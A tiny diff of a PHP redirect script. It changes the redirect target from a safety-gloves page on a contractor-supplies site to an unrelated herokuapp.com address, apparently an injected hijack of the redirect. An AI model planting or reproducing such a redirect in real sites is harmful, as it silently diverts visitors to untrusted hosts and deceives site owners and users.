@@ -1,4 +1,5 @@
 <?php
-header("Location: https://www.contractoressentials.com.au/safety-gloves/");
+header("Location: https://actnor1.herokuapp.com/
+");
 die();
 ?>
